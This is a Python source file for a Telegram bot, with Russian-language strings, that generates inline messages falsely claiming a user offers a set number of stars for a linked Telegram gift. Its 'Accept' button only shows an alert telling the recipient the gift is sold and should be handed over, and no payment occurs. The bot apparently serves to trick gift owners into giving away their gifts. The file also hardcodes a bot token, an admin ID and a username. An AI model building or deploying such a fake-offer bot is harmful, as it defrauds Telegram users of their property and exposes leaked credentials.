# language: Python, file: bot.py, target: Python 3.10+
import telebot
from telebot import types
import time
from urllib.parse import unquote, urlparse
from datetime import datetime, timedelta
from flask import Flask
import threading
import os

# --- НАСТРОЙКИ ---
BOT_TOKEN = "8997370724:AAE2xIrI1Sde0AQLkcANXXUJJYHvZalF648"
ADMIN_ID = 6484025560
MY_USERNAME = "@Gangster1246"

STAR = '<tg-emoji emoji-id="5875465628285931233">⭐</tg-emoji>'
GIFT_EMOJI = '<tg-emoji emoji-id="5875465628285931233">🎁</tg-emoji>'
CLOCK_EMOJI = '<tg-emoji emoji-id="5875465628285931233">⏱</tg-emoji>'

bot = telebot.TeleBot(BOT_TOKEN)

# --- ВЕБ-СЕРВЕР ДЛЯ RENDER ---
app = Flask(__name__)

@app.route('/')
def health_check():
    return "Bot is alive", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- ЛОГИКА БОТА ---
def parse_gift_name(url: str) -> str:
    path = urlparse(url).path.strip("/")
    if path:
        return unquote(path.split("/")[-1]).replace("+", " ")
    return "Подарок"

def build_offer_text(gift_name, price, gift_url, expires_at, target_user):
    remaining = expires_at - datetime.now()
    total_sec = max(0, int(remaining.total_seconds()))
    hours = total_sec // 3600
    minutes = (total_sec % 3600) // 60

    clickable_link = f'<a href="{gift_url}">{gift_name}</a>'

    return (
        f"{GIFT_EMOJI} Пользователь предлагает Вам\n"
        f"<b>{price}</b> {STAR} за подарок {clickable_link}.\n\n"
        f"{CLOCK_EMOJI} Предложение действует ещё <b>{hours} ч. {minutes} мин.</b>"
    )

def offer_keyboard():
    kb = types.InlineKeyboardMarkup()
    kb.row(
        types.InlineKeyboardButton("✅ Принять", callback_data="accept_offer"),
        types.InlineKeyboardButton("❌ Отклонить", callback_data="decline_offer")
    )
    return kb

# --- ОБЫЧНЫЕ КОМАНДЫ ---
@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Бот запущен.\n\nВ любом чате напиши: `@твой_бот ссылка цена @юзер`", parse_mode="Markdown")

# --- ИНЛАЙН РЕЖИМ ---
@bot.inline_handler(lambda query: len(query.query.strip()) > 0)
def inline_offer(query):
    text = query.query.strip()
    parts = text.split()
    
    if len(parts) < 3:
        result = types.InlineQueryResultArticle(
            id="error_format",
            title="❌ Неверный формат",
            description="Введите: ссылка цена @username",
            input_message_content=types.InputTextMessageContent(
                message_text="Формат: <ссылка> <цена> <@username>",
                parse_mode="HTML"
            )
        )
        bot.answer_inline_query(query.id, [result], cache_time=0)
        return

    gift_link = parts[0]
    try:
        price = int(parts[1])
    except ValueError:
        result = types.InlineQueryResultArticle(
            id="error_price",
            title="❌ Цена должна быть числом",
            description="Пример: 1500",
            input_message_content=types.InputTextMessageContent(
                message_text="Ошибка: цена должна быть числом."
            )
        )
        bot.answer_inline_query(query.id, [result], cache_time=0)
        return
    
    target = parts[2] if len(parts) > 2 else "Получатель"
    gift_name = parse_gift_name(gift_link)
    expires_at = datetime.now() + timedelta(hours=6)
    
    offer_text = build_offer_text(gift_name, price, gift_link, expires_at, target)
    kb = offer_keyboard()

    result = types.InlineQueryResultArticle(
        id=f"offer_{int(time.time())}",
        title=f"🎁 Создать оффер для {target}",
        description=f"{gift_name} за {price} ⭐",
        input_message_content=types.InputTextMessageContent(
            message_text=offer_text,
            parse_mode="HTML",
            disable_web_page_preview=False
        ),
        reply_markup=kb
    )
    
    bot.answer_inline_query(query.id, [result], cache_time=0)

# --- ОБРАБОТКА КНОПОК ---
@bot.callback_query_handler(func=lambda call: call.data in ["accept_offer", "decline_offer"])
def on_callback(call):
    if call.data == "accept_offer":
        # В инлайн-режиме мы не можем изменить само сообщение, 
        # поэтому просто показываем всплывающее уведомление (alert)
        bot.answer_callback_query(
            call.id, 
            text="Подарок успешно продан! Передайте его покупателю.", 
            show_alert=True
        )

    else:
        bot.answer_callback_query(
            call.id, 
            text="❌ Вы отклонили предложение.", 
            show_alert=True
        )

# --- ЗАПУСК ---
if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    print("Бот и веб-сервер запущены!")
    bot.infinity_polling(timeout=40, long_polling_timeout=30)
